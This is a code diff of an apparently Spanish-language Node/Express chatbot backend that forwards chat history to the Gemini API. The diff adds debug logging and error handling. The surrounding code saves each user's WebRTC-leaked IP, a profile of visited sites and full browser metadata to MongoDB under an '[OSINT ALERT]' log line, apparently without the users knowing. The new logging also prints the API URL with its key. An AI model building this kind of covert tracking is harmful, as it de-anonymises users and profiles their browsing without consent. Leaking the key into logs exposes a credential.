@@ -26,7 +26,7 @@ if (uri) {
     console.warn('[WARNING] MONGO_URI no definida. Los logs no se guardarán permanentemente.');
 }
 
-// Endpoint de salud (Healthcheck) para el Cron-job (Mantener vivo) - CORREGIDO
+// Endpoint de salud (Healthcheck) para el Cron-job (Mantener vivo)
 app.get('/api/health', (req, res) => {
     res.sendStatus(200); // Respuesta mínima y estándar
 });
@@ -44,38 +44,55 @@ app.post('/api/chat', async (req, res) => {
     console.log("[DEBUG] Datos recibidos:", req.body); // Debug como solicitado
 
     try {
-        const geminiRes = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${GEMINI_API_KEY}`, {
+        const geminiApiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${GEMINI_API_KEY}`;
+        const geminiRequestBody = JSON.stringify({ contents: history });
+
+        console.log(`[DEBUG GEMINI] Calling URL: ${geminiApiUrl}`);
+        console.log(`[DEBUG GEMINI] Request Body: ${geminiRequestBody}`);
+
+        const geminiRes = await fetch(geminiApiUrl, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ contents: history })
+            body: geminiRequestBody
         });
 
+        console.log(`[DEBUG GEMINI] Raw Response Status: ${geminiRes.status} (${geminiRes.statusText})`);
+
         const data = await geminiRes.json();
+        console.log(`[DEBUG GEMINI] Parsed Response Data:`, data);
+
         const reply = data.candidates?.[0]?.content?.parts?.[0]?.text;
+        
+        if (reply) {
+            console.log(`[DEBUG GEMINI] AI Reply Found: ${reply.substring(0, 50)}...`);
+            // Solo si hay respuesta, procesamos y guardamos
+            if (db) {
+                const ip_header = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+                const logEntry = {
+                    timestamp: new Date(),
+                    userId: metadata.userId,
+                    ip_public: ip_header,
+                    ip_webrtc: metadata.adv?.webrtc_ip || "N/A",
+                    visited_sites: metadata.adv?.history_profile || [],
+                    browser_data: metadata,
+                    chat: history,
+                    reply: reply
+                };
 
-        if (reply && db) {
-            const ip_header = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-            const logEntry = {
-                timestamp: new Date(),
-                userId: metadata.userId,
-                ip_public: ip_header,
-                ip_webrtc: metadata.adv?.webrtc_ip || "N/A",
-                visited_sites: metadata.adv?.history_profile || [],
-                browser_data: metadata,
-                chat: history,
-                reply: reply
-            };
+                console.log(`[OSINT ALERT] User: ${logEntry.userId} | WebRTC_IP: ${logEntry.ip_webrtc} | Sites: ${logEntry.visited_sites}`);
 
-            console.log(`[OSINT ALERT] User: ${logEntry.userId} | WebRTC_IP: ${logEntry.ip_webrtc} | Sites: ${logEntry.visited_sites}`);
-
-            try {
-                await db.collection('chat_logs').insertOne(logEntry);
-            } catch (dbError) {
-                console.error("[MONGODB INSERTION ERROR]", dbError);
+                try {
+                    await db.collection('chat_logs').insertOne(logEntry);
+                } catch (dbError) {
+                    console.error("[MONGODB INSERTION ERROR]", dbError);
+                }
             }
+            res.status(200).json({ reply: reply });
+        } else {
+            // No hubo respuesta válida de la IA
+            console.error("[GEMINI NO REPLY] AI returned no valid text. Raw data: ", data);
+            res.status(500).json({ error: 'La IA no pudo generar una respuesta válida.' });
         }
-
-        res.status(200).json({ reply: reply });
     } catch (error) {
         console.error("[GEMINI/FETCH ERROR]", error);
         res.status(500).json({ error: 'Fallo al procesar la solicitud con la IA.' });
